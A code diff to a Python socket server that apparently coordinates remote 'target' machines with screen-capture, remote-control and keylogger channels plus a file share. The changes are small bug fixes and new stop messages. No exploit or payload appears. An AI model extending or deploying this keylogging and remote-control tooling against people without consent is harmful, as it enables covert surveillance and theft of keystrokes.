@@ -72,7 +72,7 @@ class Server(BaseSocket):
                 return
         self.socket.listen()
         if not self.file_server_running:
-            Thread(target=self.start_file_server, args=("/srv/fileShare",)
+            Thread(target=self.start_file_server, args=("../Files",)
                    ).start()
         self.run()
 
@@ -139,7 +139,8 @@ class Server(BaseSocket):
         logging.info("Main Target client connected")
         try:
             code = client.recv_data().decode(self.FORMAT)
-            identity = print(client.recv_data().decode(self.FORMAT))
+            identity = client.recv_data().decode(self.FORMAT)
+            print(identity)
             # identity = json.loads(client.recv_data().decode(self.FORMAT))
         except (ConnectionResetError, BrokenPipeError):
             logging.info(f"Main target client {code} disconnected")
@@ -164,6 +165,11 @@ class Server(BaseSocket):
             while client.running and self.running:
                 with lock:
                     client.send_data(Actions.WAIT)
+                    # print(f"target {code} waiting...")
+                    feedback = client.recv_data()
+                    # logging.debug(feedback)
+                    if feedback == Actions.DISCONNECT:
+                        break
                 sleep(1)
 
         except (ConnectionResetError, BrokenPipeError):
@@ -233,7 +239,6 @@ class Server(BaseSocket):
             while running and self.running:
                 if IMAGE_SEND_MODE == ImageSendModes.DIRECT_JPG:
                     target.img = target.recv_data()
-                    print("here")
                     with open("img.jpg", "wb") as f:
                         f.write(target.img)
                 elif IMAGE_SEND_MODE == ImageSendModes.DIFF:
@@ -265,6 +270,8 @@ class Server(BaseSocket):
                     i = 0
                 running = self.targets[code].main is not None and not \
                     target.marked_for_stop
+            with self.targets[code].lock:
+                self.targets[code].main.send_data(Actions.STOP_SCREEN_READER)
 
         except (BrokenPipeError, ConnectionResetError, KeyError,
                 UnidentifiedImageError):
@@ -298,6 +305,8 @@ class Server(BaseSocket):
                 running = self.targets[code].main is not None and \
                     not target.marked_for_stop
                 sleep(0.001)
+            with self.targets[code].lock:
+                self.targets[code].main.send_data(Actions.STOP_CONTROLLER)
         except (BrokenPipeError, ConnectionResetError):
             logging.info(f"Connection to target controller client {code} "
                          "failed unexpectedly. Removing it.")
@@ -335,6 +344,8 @@ class Server(BaseSocket):
                     continue
                 target.vks = data
                 target.ready = True
+            with self.targets[code].lock:
+                self.targets[code].main.send_data(Actions.STOP_KEYLOGGER)
 
         except (BrokenPipeError, ConnectionResetError):
             logging.info(f"Connection to target keylogger client {code} "
@@ -472,7 +483,8 @@ class Server(BaseSocket):
                                 f" in a reasonable time. stopping {code} "
                                 "screen reader")
                     watcher.socket.close()
-                    self.watchers[code].screen_reader = None
+                    if code in self.watchers:
+                        self.watchers[code].screen_reader = None
                     logging.info(f"Watcher screen reader client {code} "
                                 "disconnected")
                     return
